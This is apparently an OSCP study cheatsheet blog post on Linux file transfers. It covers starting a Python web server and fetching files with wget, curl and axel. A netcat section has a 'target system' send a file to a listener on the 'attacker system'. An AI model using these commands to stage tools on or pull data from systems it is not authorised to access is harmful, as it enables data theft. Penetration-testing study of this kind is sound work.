---
title: Linux File Transfers
author: linatl
date: "2021-03-20 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Start a webserver
```
Python3
> sudo python3 -m http.server 80
Python2
> sudo python -m SimpleHTTPServer 80
```

###### Download from bash
```
> wget 192.168.1.1:443/file.txt
> curl 192.168.1.1:443/file.txt -o file.txt
> axel 192.168.1.1:443/file.txt -o file.txt
```

###### netcat
```
On the attacker system:
> nc -lvp 80 > file.txt
On the target system:
> nc 192.168.1.1 80 < file.txt
```
